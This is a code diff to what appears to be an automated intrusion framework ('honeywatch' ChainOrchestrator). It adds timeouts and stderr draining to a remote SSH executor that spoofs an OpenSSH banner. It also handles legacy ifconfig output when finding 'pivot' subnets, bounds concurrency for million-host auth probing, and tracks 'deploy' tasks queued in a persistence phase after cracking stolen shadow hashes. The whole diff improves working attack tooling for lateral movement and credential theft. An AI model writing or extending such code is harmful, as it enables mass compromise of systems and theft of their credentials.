@@ -154,6 +154,10 @@ def _ssh_exec(
         transport = paramiko.Transport((ip, port))
         transport._CLIENT_IDENTITY = "SSH-2.0-OpenSSH_9.0p1 Debian-1"
         transport.local_version = "SSH-2.0-OpenSSH_9.0p1 Debian-1"
+        # set_timeout governs the banner exchange + auth window so a host that
+        # accepts the TCP connect but never finishes the SSH handshake cannot
+        # hang the foothold/pivot phase indefinitely.
+        transport.set_timeout(timeout_s)
         transport.start_client(timeout=timeout_s)
         if key_path:
             pkey = paramiko.RSAKey.from_private_key_file(key_path)
@@ -164,19 +168,34 @@ def _ssh_exec(
         chan.settimeout(timeout_s)
         chan.exec_command(command)
         out = b""
-        while not chan.exit_status_ready():
-            data = chan.recv(4096)
-            if not data:
-                break
-            out += data
-        # drain any remaining
-        try:
-            while chan.recv_ready():
+        err = b""
+        # Drain BOTH stdout and stderr until the channel closes. Reading only
+        # stdout deadlocks a command that writes more than the pipe buffer to
+        # stderr: the remote process blocks on a full stderr buffer while we sit
+        # waiting on a stdout stream that never grows. Poll both streams against
+        # an overall deadline so a hung command is cut off rather than looping.
+        deadline = time.monotonic() + timeout_s
+        while True:
+            got = False
+            if chan.recv_ready():
                 out += chan.recv(4096)
-        except Exception:
-            pass
+                got = True
+            if chan.recv_stderr_ready():
+                err += chan.recv_stderr(4096)
+                got = True
+            if (chan.exit_status_ready()
+                    and not chan.recv_ready()
+                    and not chan.recv_stderr_ready()):
+                break
+            if not got:
+                if time.monotonic() > deadline:
+                    break
+                time.sleep(0.01)
         rc = chan.recv_exit_status()
-        return rc, out.decode("utf-8", "replace"), None
+        text = out.decode("utf-8", "replace")
+        if err:
+            text += "\n[stderr]\n" + err.decode("utf-8", "replace")
+        return rc, text, None
     except Exception as exc:
         return None, "", f"{type(exc).__name__}: {exc}"
     finally:
@@ -188,7 +207,13 @@ def _ssh_exec(
 
 
 def _adjacent_subnets(interfaces_text: str) -> list[str]:
-    """Parse `ip -o -4 addr` output into /24s the host sits on (pivot seeds)."""
+    """Parse `ip -o -4 addr` (or `ifconfig`) output into /24s the host sits on.
+
+    The pivot command is ``ip -o -4 addr || ifconfig``, so this must handle both
+    shapes: modern ``ip`` (``inet 10.0.0.5/24 ...``) and the two ``ifconfig``
+    forms — new (``inet 10.0.0.5 netmask ...``) and legacy net-tools
+    (``inet addr:10.0.0.5  Bcast:...  Mask:...``).
+    """
     nets: list[str] = []
     for line in interfaces_text.splitlines():
         # format: "2: eth0    inet 10.0.0.5/24 brd ... scope global eth0"
@@ -196,8 +221,10 @@ def _adjacent_subnets(interfaces_text: str) -> list[str]:
             continue
         try:
             inet_part = line.split(" inet ", 1)[1].split()[0]
+            # Legacy ifconfig: "inet addr:10.0.0.5" -> first token is "addr:10.0.0.5".
+            if inet_part.startswith("addr:"):
+                inet_part = inet_part[len("addr:"):]
             ip_cidr = inet_part.split("/")[0]
-            cidr = int(inet_part.split("/")[1]) if "/" in inet_part else 32
         except (IndexError, ValueError):
             continue
         if ip_cidr.startswith(("127.", "169.254.")):
@@ -288,12 +315,21 @@ class ChainOrchestrator:
         probe_user = self.cfg.users[0] if self.cfg.users else "root"
         # Concurrent auth-method precheck: serial probing is the bottleneck on
         # planet-scale host lists (every other network phase is already
-        # concurrent). auth_methods never raises, so gather is safe.
+        # concurrent). auth_methods never raises, so gather is safe. Bound the
+        # fan-out with host_concurrency so a million-host enumerate doesn't
+        # try to hand a million threads to the default executor at once.
         if self.state.hosts:
+            sem = asyncio.Semaphore(max(1, self.cfg.host_concurrency))
+
             async def _probe_all():
+                async def _one(ip: str, port: int):
+                    async with sem:
+                        return await asyncio.to_thread(
+                            auth_methods, ip, port, probe_user
+                        )
+
                 return await asyncio.gather(
-                    *(asyncio.to_thread(auth_methods, ip, port, probe_user)
-                      for ip, port in self.state.hosts)
+                    *(_one(ip, port) for ip, port in self.state.hosts)
                 )
             ams = asyncio.run(_probe_all())
         else:
@@ -402,6 +438,7 @@ class ChainOrchestrator:
             return
         from honeywatch.hashcrack import crack_shadow
 
+        store = self._store()
         new_creds = 0
         seen = {(c["ip"], c["port"], c["user"], c["password"])
                 for c in self.state.credentials}
@@ -416,7 +453,7 @@ class ChainOrchestrator:
             res = crack_shadow(stash, self.cfg.hashcrack_wordlist,
                                tool=self.cfg.hashcrack_tool)
             for c in res.credentials():
-                self._store().upsert_credential(
+                store.upsert_credential(
                     ip, port, c["user"], c["password"], attempts=1,
                     source="chain-hashcrack")
                 new_creds += 1
@@ -462,8 +499,14 @@ class ChainOrchestrator:
             # The chain only enqueues; a separately-launched `honeywatch worker`
             # picks up the tasks and executes them (its own --exec-mode). Track
             # what we queued, not what has run -- we cannot know the latter
-            # synchronously.
-            self.state.enqueued = [(t.ip, t.port) for t in targets]
+            # synchronously. Accumulate unique (ip, port) across rounds so the
+            # run summary reflects everything queued, not just the last round.
+            seen_q = set(self.state.enqueued)
+            for t in targets:
+                key = (t.ip, t.port)
+                if key not in seen_q:
+                    self.state.enqueued.append(key)
+                    seen_q.add(key)
             self._emit(ChainPhase.PERSIST,
                        f"enqueued {op.id}: {len(targets)} deploy task(s) "
                        f"(worker executes async)")
